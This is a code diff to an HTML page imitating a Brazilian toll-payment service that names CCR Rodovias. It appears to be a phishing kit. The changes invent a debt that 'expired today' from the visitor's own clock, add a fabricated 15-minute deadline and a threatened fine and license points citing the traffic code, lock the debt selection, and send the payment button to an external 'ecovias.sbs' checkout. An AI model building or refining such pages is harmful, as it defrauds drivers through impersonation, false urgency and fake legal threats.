@@ -9,13 +9,22 @@
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Ubuntu',sans-serif;background:#f2f2f2;color:#333;min-height:100vh;padding-bottom:140px}
 
-/* Modal overlay */
+/* Modal Overlay */
 .modal-overlay{position:fixed;inset:0;z-index:2000;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.7);padding:20px}
-.modal-box{width:100%;max-width:400px;border-radius:24px;background:#fff;padding:24px;text-align:center}
-.modal-title{display:flex;align-items:center;justify-content:center;gap:8px;font-weight:700;color:#d32f2f;margin-bottom:12px;font-size:15px}
-.modal-text{font-size:13px;margin-bottom:20px;line-height:1.5}
-.modal-text b{color:#d32f2f;font-weight:700}
-.modal-btn{width:100%;border:none;border-radius:12px;background:#000;color:#fff;padding:16px;font-weight:700;font-size:14px;cursor:pointer}
+.modal-box{width:100%;max-width:450px;border-radius:35px;background:#fff;padding:30px;text-align:center;position:relative}
+.modal-box::before { content: ""; position: absolute; top: 15px; left: 50%; transform: translateX(-50%); width: 40px; height: 4px; background: #e0e0e0; border-radius: 10px; }
+.modal-title{display:flex;align-items:center;justify-content:center;gap:10px;font-weight:700;color:red;margin-bottom:15px;font-size:22px;text-transform: uppercase;}
+.modal-subtitle { font-weight: 700; font-size: 16px; margin-bottom: 20px; color: #000; }
+.modal-text{font-size:14px;margin-bottom:20px;line-height:1.5; color: #333; text-align: center;}
+.modal-text b.red-text {color:red;font-weight:700}
+
+/* Box CTB */
+.ctb-box { text-align: left; border-left: 3px solid red; padding-left: 15px; margin: 20px 0; font-size: 13px; line-height: 1.4; }
+.ctb-box h3 { font-size: 15px; margin-bottom: 8px; font-weight: 700; }
+.ctb-box p { margin-bottom: 8px; color: #555; }
+.ctb-box span { display: block; margin-top: 5px; }
+
+.modal-btn{width:100%;border:none;border-radius:15px;background:#000;color:#fff;padding:18px;font-weight:700;font-size:16px;cursor:pointer;text-transform: uppercase; margin-top: 10px;}
 
 /* Header */
 header{position:relative;display:flex;align-items:center;justify-content:center;height:56px;border-bottom:1px solid #e0e0e0;background:#fff}
@@ -31,13 +40,12 @@ header h1{font-size:16px;font-weight:500}
 .plate-wrap{position:relative;z-index:10;margin-top:-28px;padding:0 20px}
 .plate-box{border-radius:8px;border:1px solid #eee;background:#fff;padding:16px 20px;font-size:15px;font-weight:700;box-shadow:0 2px 8px rgba(0,0,0,.08)}
 
-/* Section */
+/* Debt Section */
 .debt-section{padding:20px}
 .cb-row{display:flex;align-items:center;gap:10px;font-size:13px;font-weight:500;margin-bottom:20px}
-.cb-row input{width:20px;height:20px;cursor:pointer;accent-color:#000}
+.cb-row input{width:20px;height:20px;cursor:default;accent-color:#000}
 
-/* Debt card */
-.debt-card{margin-bottom:24px}
+.debt-card{margin-bottom:24px; padding: 15px; background: #fff; border-radius: 12px; border: 1px solid #eee;}
 .debt-top{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:4px}
 .debt-top .plate{font-weight:700}
 .badge{border:1px solid #d32f2f;border-radius:8px;padding:2px 6px;font-size:10px;font-weight:700;color:#d32f2f}
@@ -45,25 +53,26 @@ header h1{font-size:16px;font-weight:500}
 .debt-bottom{display:flex;align-items:flex-end;justify-content:space-between}
 .debt-bottom .operator{font-weight:700}
 .debt-bottom .amount{font-size:16px;font-weight:700}
-.debt-fine{display:block;text-align:right;font-size:11px;color:#d32f2f;margin-top:4px}
-.debt-total{display:block;text-align:right;font-size:13px;font-weight:700;margin-top:4px}
 
-/* Payment */
-.payment-area{margin-top:24px}
-.payment-area h2{font-size:15px;font-weight:700;margin-bottom:12px}
-.pix-option{display:flex;align-items:center;gap:16px;border-radius:12px;border:2px solid transparent;background:#fff;padding:16px;cursor:pointer;transition:.2s}
-.pix-option.selected{border-color:#eaff00;background:#fafdf0}
-.pix-icon{width:40px;height:40px;display:flex;align-items:center;justify-content:center;border-radius:8px;background:#eaff00;overflow:hidden}
-.pix-icon img{width:100%;height:100%;object-fit:contain;padding:4px}
-.pix-label{flex:1;font-size:14px;font-weight:700}
-
-/* Footer */
+/* Footer Bar */
 .footer-bar{position:fixed;bottom:0;left:0;z-index:100;width:100%;border-radius:16px 16px 0 0;background:#fff;padding:16px 20px;box-shadow:0 -4px 10px rgba(0,0,0,.05)}
-.footer-total-label{font-size:13px;color:#666}
 .footer-total-value{font-size:16px;font-weight:700;color:#000;margin-bottom:10px;display:block}
-.footer-btn{width:100%;border:none;border-radius:8px;padding:14px;font-size:14px;font-weight:700;transition:.2s;cursor:pointer}
-.footer-btn.active{background:#000;color:#fff}
-.footer-btn.disabled{background:#ccc;color:#fff;cursor:not-allowed}
+
+/* Botão Regularizar - Amarelo e Preto */
+.footer-btn{
+    width:100%;
+    border:none;
+    border-radius:12px;
+    padding:18px;
+    font-size:16px;
+    font-weight:800;
+    cursor:pointer;
+    background:#cfff00; 
+    color:#000000;      
+    text-transform: uppercase;
+    transition: 0.3s;
+}
+.footer-btn:active { transform: scale(0.98); opacity: 0.9; }
 
 .hidden{display:none}
 </style>
@@ -73,10 +82,22 @@ header h1{font-size:16px;font-weight:500}
 <div class="modal-overlay" id="modal">
   <div class="modal-box">
     <div class="modal-title">⚠ ATENÇÃO</div>
+    <div class="modal-subtitle">Débitos em aberto encontrados</div>
+    
     <p class="modal-text">
-      <b id="modalTime"></b> - Caso não realize o pagamento, o sistema emitirá automaticamente a multa de
-      <b>R$ 195,23</b> e <b>5 pontos na CNH</b>.
+      <b class="red-text" id="modalFullTime"></b> - Caso não realize o pagamento, a multa será automaticamente encaminhada ao DETRAN. 
+      Após esse prazo de <b>15 minutos (até <span id="deadlineTime">--:--</span>)</b>, caso você não realize o pagamento, o sistema emitirá automaticamente a multa de 
+      <b class="red-text">R$ 195,23</b> e <b class="red-text">5 pontos na CNH</b>.
     </p>
+
+    <div class="ctb-box">
+        <h3>Art. 209-A - CTB:</h3>
+        <p>Conforme o Art. 209-A do CTB: "Efetuar o pagamento de pedágio eletrônico fora do prazo estabelecido pelo órgão ou entidade de trânsito com circunscrição sobre a via."</p>
+        <span>Infração: <b class="red-text">Grave.</b></span>
+        <span>Penalidade: <b class="red-text">Multa de R$ 195,23.</b></span>
+        <span>Pontuação: <b class="red-text">5 pontos na CNH.</b></span>
+    </div>
+
     <button class="modal-btn" onclick="document.getElementById('modal').classList.add('hidden')">CONTINUAR</button>
   </div>
 </div>
@@ -97,96 +118,66 @@ header h1{font-size:16px;font-weight:500}
 
 <section class="debt-section">
   <div class="cb-row">
-    <input type="checkbox" id="debtCb"/>
+    <input type="checkbox" id="debtCb" checked onclick="return false;"/>
     <span>Selecionar 1 passagens em aberto</span>
   </div>
 
   <div class="debt-card">
     <div class="debt-top">
       <span class="plate" id="cardPlate">PLACA</span>
-      <span class="badge">Venceu em 12/02/2026</span>
+      <span class="badge" id="vencimentoBadge">Venceu hoje</span>
     </div>
-    <span class="debt-date">10/02/2026 02:30:38</span>
+    <span class="debt-date" id="currentFullDate">--/--/---- --:--:--</span>
     <div class="debt-bottom">
       <span class="operator">CCR Rodovias</span>
-      <span class="amount">R$ 71,49</span>
-    </div>
-    <span class="debt-fine">Multa + Juros: R$ 0,00 + R$ 0,00</span>
-    <span class="debt-total">Total: 71,49</span>
-  </div>
-
-  <div class="payment-area hidden" id="paymentArea">
-    <h2>Forma de pagamento</h2>
-    <div class="pix-option" id="pixOption" onclick="selectPix()">
-      <div class="pix-icon">
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAApCAYAAABHomvIAAAEOklEQVR4AcyYS2wTVxSG/xmVPiQMplIrBUIbWqm4j4RWVFAJV6KCbkil2qabUqnj7kpD93E2bTdx9iWwTIwU2MVGImwAgYSReIpHeAQk3mBLIEGIWfCKL+e/4QYnWGQ8HuIZzfHM3Hvn3G/O+c/ckW1U2a6qWPiWSiRvq8S/s2EFtT5WVLGWKiiYAshBBRXf/zas+xZUH6D+wSyYQjlbhnVVgtFHhkrQScCiWu/IoJMKWI2GbSpJBrIYBA1YVL+sLqPcL41hsUbvYbLcVDEdKA2oMC7pbDTX1PltWH2sBfuWiiUlrS1TuwNx1fIO7KQtpE4gcKpCqJ9tid7XVfsC0Eg2WziCUBiCUXUPE7BqT1AafQMce/AM27bc1Hb7xiPfns8XwJHhh/jxqzzSnRe1xVcdRnag6Atk3YCEc9YdRyg8B3vPRrU1f/weujae8wWyLsBKuMzQciz66F1tPP+8LeQLpGdAA0ftrWn/QIOZnIbmv4XOns/0Zb2R9Ay4UKL1/45lWPPTh1IYN9CbvqKB+EP4v389jUWS6szu5Vjx/QI2e7KaAXMi/rWteSSihzVUSiIV/60JmwWQkIQzmmSqjx28D6f9OHiPl8KpCZBwKRF/aP4crIi+j5EzD0GYjtSnMJC8ZsEQrjd9WYNHWkMSPcuTJl0DMjKEi7SFwMm7t36hj6UH41MgK+EYsY7UJ9i8fRmy+ZUwhXNUoirErnbXgF1/npvQlFTrPCkCeo+0zX0FclBAGDkDt0kAOTYk9/DBqMvenpd6Zd/rzDXgheES4huaYOCMU0JSh1w9EtEjWpuEY2EYODOWkPTxRiLICbMDBRDETMgjU88VhJFh9Abz34F6JASLhmOM8ZVEHxGRiWmb6eg6gqn0Uhi9GUjCTS+KhCxzHRVFYyAJ56w7oR+QEZ8JzPS7BoxM01vXxvO6OKYXBeEdWfoqITdtOC1jT2BEZNK99Ut5A7h/L7oG5BMZyHmy7h7N30NEUkXhVxZFVlJsIk3IDikSgpXGnoJwTD99ubWaAOk0IpGk1jJD34KTpzsvITtQ1OcsCvYT2kDy1UJd7h2Oam3SRy1WM6BxziJwRFP7dt2ZhDN9hOyW9yTTTSkU6vg+9AzIVHWLngi1b+guWAQ8pxGMlU0pMJqR1rls9mSeATmbgRw5U4LTPlGhhHOkSEpj46gXjnPUBUgHhGRhFK4/wlr5qqb5BUf/dQPSCTU3eGglUj1Lte0ZXoV60kqfxnwBpDN+Tf/+12LQpi+H7PdqvgF6BZjpPgKOzjSogf2jtgWcQkA3skkErZ0B5UMZVsZ+LH9cCum1AEJea7YG++0lVm50HOqPoAGWXzBJioHFVu6AmmgIQsGMkoVMDJoG5Emzleu3ob6R/+QyvG6EidQOkIEsZv5JQDY0WTnJezYpg5ZI2uOA9d9sGCP2BGrBQiv7AxlQsT0HAAD//3SWnEIAAAAGSURBVAMA0yh2lU3d0/oAAAAASUVORK5CYII=" alt="Pix"/>
-      </div>
-      <div class="pix-label">Pix</div>
-      <span>❯</span>
+      <span class="amount">R$ 73,46</span>
     </div>
   </div>
 </section>
 
 <div class="footer-bar">
-  <span class="footer-total-label">Total a pagar:</span>
-  <span class="footer-total-value" id="totalValue">R$ 0,00</span>
-  <button class="footer-btn disabled" id="payBtn" onclick="pay()">Continuar</button>
+  <span class="footer-total-value">Total a pagar: R$ 73,46</span>
+  <button class="footer-btn" onclick="pay()">Regularizar</button>
 </div>
 
 <script>
-// Read plate from URL
 const params = new URLSearchParams(location.search);
-const plate = (params.get('plate') || 'PLACA').toUpperCase();
+const plate = (params.get('placa') || 'PLACA').toUpperCase();
 document.getElementById('plateBox').textContent = plate;
 document.getElementById('cardPlate').textContent = plate;
 
-// Time
-const now = new Date();
-const hh = String(now.getHours()).padStart(2,'0');
-const mm = String(now.getMinutes()).padStart(2,'0');
-document.getElementById('modalTime').textContent = 'Hoje às ' + hh + ':' + mm;
+function updateDynamicData() {
+    const dias = ['Domingo', 'Segunda-feira', 'Terça-feira', 'Quarta-feira', 'Quinta-feira', 'Sexta-feira', 'Sábado'];
+    const now = new Date();
+    
+    // Data e Hora Atual
+    const dia = String(now.getDate()).padStart(2, '0');
+    const mes = String(now.getMonth() + 1).padStart(2, '0');
+    const ano = now.getFullYear();
+    const hh = String(now.getHours()).padStart(2, '0');
+    const mm = String(now.getMinutes()).padStart(2, '0');
+    const ss = String(now.getSeconds()).padStart(2, '0');
+    
+    const diaSemana = dias[now.getDay()];
 
-let debtSelected = false;
-let pixSelected = false;
+    // Atualiza Badge de Vencimento
+    document.getElementById('vencimentoBadge').textContent = `Venceu em ${dia}/${mes}/${ano}`;
+    document.getElementById('currentFullDate').textContent = `${dia}/${mes}/${ano} ${hh}:${mm}:${ss}`;
+    
+    // Atualiza Tempo no Modal
+    document.getElementById('modalFullTime').textContent = `Hoje, ${diaSemana} às ${hh}:${mm}`;
 
-const debtCb = document.getElementById('debtCb');
-const paymentArea = document.getElementById('paymentArea');
-const pixOption = document.getElementById('pixOption');
-const totalValue = document.getElementById('totalValue');
-const payBtn = document.getElementById('payBtn');
-
-debtCb.addEventListener('change', function(){
-  debtSelected = this.checked;
-  pixSelected = false;
-  pixOption.classList.remove('selected');
-  paymentArea.classList.toggle('hidden', !debtSelected);
-  update();
-});
-
-function selectPix(){
-  if(debtSelected){
-    pixSelected = true;
-    pixOption.classList.add('selected');
-    update();
-  }
+    // Calcula Prazo de 15 Minutos
+    const deadline = new Date(now.getTime() + 15 * 60000);
+    const dHH = String(deadline.getHours()).padStart(2, '0');
+    const dMM = String(deadline.getMinutes()).padStart(2, '0');
+    document.getElementById('deadlineTime').textContent = `${dHH}:${dMM}`;
 }
 
-function update(){
-  totalValue.textContent = debtSelected ? 'R$ 71,49' : 'R$ 0,00';
-  if(debtSelected && pixSelected){
-    payBtn.className = 'footer-btn active';
-    payBtn.textContent = 'Pagar';
-  } else {
-    payBtn.className = 'footer-btn disabled';
-    payBtn.textContent = 'Continuar';
-  }
-}
+updateDynamicData();
 
 function pay(){
-  if(debtSelected && pixSelected){
-    // Redireciona para o link de checkout fornecido
     window.location.href = 'https://checkout.ecovias.sbs/VCCL1O8SCGP0';
-  }
 }
 </script>
 </body>
